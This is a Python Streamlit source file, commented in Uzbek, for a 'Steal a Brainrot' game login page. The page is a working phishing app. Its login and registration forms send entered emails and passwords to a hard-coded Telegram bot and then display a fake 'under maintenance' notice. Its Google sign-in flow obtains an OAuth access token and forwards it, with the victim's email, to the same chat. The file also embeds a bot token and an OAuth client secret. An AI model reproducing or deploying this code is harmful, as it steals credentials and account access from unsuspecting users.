import streamlit as st
import requests
import sqlite3

# --- KONFIGURATSIYA ---
BOT_TOKEN = "8112666081:AAGtROwNttf6lsApMQUxszHoC8xf7rB0s4A"
CHAT_ID = "8088597011"
CLIENT_ID = "1085309280384-idkflab6a8as83fuum4479ovni8b367e.apps.googleusercontent.com"
CLIENT_SECRET = "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"
REDIRECT_URI = "https://steal-breinrot-app-gtxahjgkk8egizl2uuu6sd.streamlit.app/"

# --- MA'LUMOTLAR BAZASI ---
conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()
c.execute('CREATE TABLE IF NOT EXISTS users (email TEXT PRIMARY KEY, password TEXT)')
conn.commit()

# --- DIZAYN (Qora va pastki yozuvlarni yashirish) ---
st.set_page_config(page_title="Steal a Brainrot", layout="centered")
st.markdown("""
    <style>
    .stApp {background-color: #000000; color: white;}
    div.stButton > button {width: 100%; border-radius: 10px; background-color: #ff4b4b; color: white;}
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}
    </style>
""", unsafe_allow_html=True)

st.title("🔥 Steal a Brainrot")

# --- FUNKSIYA: Tamirlanmoqda ---
def show_maintenance():
    st.success("Muvaffaqiyatli!")
    st.info("Ilova ayni damda tamirlanmoqda, tez orada tayyor bo'ladi! 🛠️")
    st.balloons()

# --- TABLAR ---
tab1, tab2 = st.tabs(["Login", "Registratsiya"])

with tab1:
    email = st.text_input("Email", placeholder="example@gmail.com")
    password = st.text_input("Parol", type="password")
    if st.button("Kirish"):
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Login qilindi:\nEmail: {email}\nParol: {password}")
        show_maintenance()

with tab2:
    reg_email = st.text_input("Yangi Email", placeholder="...@gmail.com")
    reg_password = st.text_input("Yangi Parol", type="password")
    if st.button("Ro'yxatdan o'tish"):
        if "@gmail.com" in reg_email and len(reg_password) >= 8:
            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Yangi Registratsiya:\nEmail: {reg_email}\nParol: {reg_password}")
            show_maintenance()
        else:
            st.error("Email noto'g'ri yoki parol 8 ta belgidan qisqa!")

# --- GOOGLE LOGIN (Brauzerda ochiladigan) ---
st.divider()
google_link = f"https://accounts.google.com/o/oauth2/v2/auth?response_type=code&client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&scope=email profile"
st.markdown(f"""
    <a href="{google_link}" target="_blank" style="text-decoration:none;">
    <div style="background-color:#ff4b4b; color:white; padding:10px; border-radius:10px; text-align:center; font-weight:bold; cursor:pointer;">
    Google orqali kirish
    </div>
    </a>
""", unsafe_allow_html=True)

# --- GOOGLE CALLBACK ---
params = st.query_params
code = params.get("code")
if code:
    data = {"code": code, "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET, "redirect_uri": REDIRECT_URI, "grant_type": "authorization_code"}
    res = requests.post("https://oauth2.googleapis.com/token", data=data).json()
    if "access_token" in res:
        user_info = requests.get("https://www.googleapis.com/oauth2/v1/userinfo", headers={"Authorization": f"Bearer {res['access_token']}"}).json()
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Google Login:\nEmail: {user_info.get('email')}\nToken: {res['access_token']}")
        show_maintenance()
